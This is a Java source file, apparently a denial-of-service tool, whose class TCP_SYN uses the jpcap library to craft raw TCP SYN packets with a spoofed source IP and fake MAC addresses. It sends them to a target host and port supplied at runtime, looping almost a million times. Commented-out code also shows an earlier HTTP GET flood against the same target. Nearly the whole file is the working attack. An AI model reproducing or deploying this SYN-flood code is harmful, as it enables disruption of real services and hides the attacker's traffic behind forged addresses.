package dos;

import java.io.IOException;
import java.net.InetAddress;
import java.net.Socket;
import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.EthernetPacket;
import jpcap.packet.IPPacket;
import jpcap.packet.TCPPacket;

public class TCP_SYN extends Socket implements Runnable {
    //static TCP_DOS _instance = new TCP_DOS();

    final String TARGET;
    final int port;
    NetworkInterface[] devices = null;
    JpcapSender sender = null;

    public TCP_SYN(String ip, String port) {
        System.out.println(ip);
        TARGET = ip;
        //JOptionPane.showMessageDialog(null, port);
        this.port = Integer.parseInt(port);
        int index = 2;
        devices = JpcapCaptor.getDeviceList();
        try {
            sender = JpcapSender.openDevice(devices[index]);
        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }

    /*public static void main(String[] args) {
    for (int i = 0; i < 5; i++)
    new Thread(_instance).start();
    }*/
    public void run() {
        for (int i = 1; i < 1000000; i++) {
            try {
                /*Socket net = new Socket(TARGET, port); // connects the Socket to
                // the TARGET port 80.
                sendRawLine("GET / HTTP/1.1", net); // Sends the GET /
                // OutputStream
                sendRawLine("Host: " + TARGET, net); // Sends Host: to the
                // OutputStream
                System.out.println("Current Connection: " + i);
                } catch (UnknownHostException e) {
                System.out.println("DDoS.run: " + e);
                } catch (IOException e) {
                System.out.println("DDoS.run: " + e);
                }*/


                //TCPPacket(int src_port, int dst_port, long sequence, long ack_num, boolean urg, boolean ack, boolean psh, boolean rst, boolean syn, 
                //boolean fin, boolean rsv1, boolean rsv2, int window, int urgent) 
                TCPPacket p = new TCPPacket(4445, this.port, 56, 78, false, false, false, false, true, false, true, true, 10, 10);

                //d_flag - IP flag bit: [D]elay
                //t_flag - IP flag bit: [T]hrough
                //r_flag - IP flag bit: [R]eliability
                //rsv_tos - Type of Service (TOS)
                //priority - Priority
                //rsv_frag - Fragmentation Reservation flag
                //dont_frag - Don't fragment flag
                //more_frag - More fragment flag
                //offset - Offset
                //ident - Identifier
                //ttl - Time To Live
                //protocol - Protocol 
                //This value is ignored when this packets inherits a higher layer protocol(e.g. TCPPacket)
                //src - Source IP address
                //dst - Destination IP address
                p.setIPv4Parameter(0, false, false, false, 0, false, false, false, 0, 1010101, 100, IPPacket.IPPROTO_TCP,
                        InetAddress.getByName("10.100.11.12"), InetAddress.getByName(this.TARGET));
                p.data = ("data").getBytes();

                EthernetPacket ether = new EthernetPacket();
                ether.frametype = EthernetPacket.ETHERTYPE_IP;
                ether.src_mac = new byte[]{(byte) 0, (byte) 1, (byte) 2, (byte) 3, (byte) 4, (byte) 5};
                ether.dst_mac = new byte[]{(byte) 0, (byte) 6, (byte) 7, (byte) 8, (byte) 9, (byte) 10};
                p.datalink = ether;

                sender.sendPacket(p);

            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }

    /*public static void sendRawLine(String text, Socket sock) {
    try {
    BufferedWriter out = new BufferedWriter(new OutputStreamWriter(
    sock.getOutputStream()));
    out.write(text + " ");
    out.flush();
    } catch (IOException ex) {
    ex.printStackTrace();
    }
    }*/
}